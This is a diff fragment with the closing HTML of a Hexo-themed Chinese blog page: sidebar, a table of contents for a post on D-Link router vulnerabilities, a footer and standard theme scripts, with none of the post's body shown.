+               data-title="D-Link系列路由器漏洞挖掘入门" data-url="http://blkstone.github.io/2017/11/09/dlink-router-vulnerabilities/">
+          </div>
+        
+      </div>
+    
+  </div>
+
+
+        </div>
+
+        
+      </div>
+
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <div class="site-overview">
+        <div class="site-author motion-element">
+          <img class="site-author-image" src="/images/avatar.jpg" alt="Ray" />
+          <p class="site-author-name">Ray</p>
+        </div>
+        <p class="site-description motion-element">关于计算机科学的学习经历与精彩文章分享。</p>
+        <div class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">474</span>
+              <span class="site-state-item-name">文章</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">15</span>
+              <span class="site-state-item-name">分類</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">142</span>
+              <span class="site-state-item-name">標籤</span>
+              </a>
+          </div>
+
+        </div>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+              <a href="https://github.com/BLKStone" target="_blank">GitHub</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Twitter</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Weibo</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">DouBan</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">ZhiHu</a>
+            </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+      </div>
+
+      
+        <div class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#原文"><span class="nav-number">1.</span> <span class="nav-text">原文</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">2.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#准备工作"><span class="nav-number">3.</span> <span class="nav-text">准备工作</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞挖掘"><span class="nav-number">4.</span> <span class="nav-text">漏洞挖掘</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#D-Link-DIR-645-amp-DIR-815-命令执行漏洞"><span class="nav-number">4.1.</span> <span class="nav-text">D-Link DIR-645 & DIR-815 命令执行漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#D-Link-DIR-300-amp-DIR-320-amp-DIR-600-amp-DIR-615-任意文件读取-信息泄露-漏洞"><span class="nav-number">4.2.</span> <span class="nav-text">D-Link DIR-300 & DIR-320 & DIR-600 & DIR-615 任意文件读取(信息泄露)漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#D-Link-DIR-300-amp-DIR-320-amp-DIR-615-权限绕过漏洞"><span class="nav-number">4.3.</span> <span class="nav-text">D-Link DIR-300 & DIR-320 & DIR-615 权限绕过漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#D-Link-DIR-645-信息泄露漏洞"><span class="nav-number">4.4.</span> <span class="nav-text">D-Link DIR-645 信息泄露漏洞</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">6.</span> <span class="nav-text">参考资料</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#复现"><span class="nav-number">7.</span> <span class="nav-text">复现</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </div>
+      
+
+    </div>
+  </div>
+
+
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; &nbsp;  2015 - 
+  2017
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">Ray</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 強力驅動
+</div>
+
+<div class="theme-info">
+  主題 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.3"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.3"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.3" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="/js/search-toggle.js"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.3" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var $sidebarInner = $('.sidebar-inner');
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.didShow', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for (i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"blkstone"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+  
+  
+
+</body>
+</html>
